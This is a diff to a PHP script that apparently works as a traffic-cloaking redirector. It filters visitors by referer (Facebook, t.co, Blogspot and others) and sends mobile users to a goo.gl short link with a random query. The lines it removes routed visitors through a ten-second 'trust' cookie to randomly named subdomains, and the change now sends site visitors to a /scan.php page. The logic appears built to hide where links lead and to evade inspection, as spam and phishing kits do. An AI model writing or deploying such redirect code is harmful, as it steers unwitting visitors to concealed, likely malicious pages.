@@ -62,7 +62,7 @@
 
   if($action == 'site'){
     $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
+    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com', 'scan.php');
     $action = 'theme';
     foreach ($refs as $ref) {
       if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
@@ -116,15 +116,8 @@
 
   if($action == 'mobile'){
     header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
-    
   }else if($action == 'site'){
-    if(isset($_COOKIE["trust"])){
-      $app_site = getSite();
-    	header("Location: http://".generate_name(rand(5,9)).".$app_site/$id");
-    }else{
-    	setcookie("trust", "true", (time() + 10), "/", ".".$_SERVER["HTTP_HOST"], false);
-      header('Location:http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
-    }
+    header("Location: /scan.php");
   }else{
     @ob_end_clean();
     @ob_end_flush();
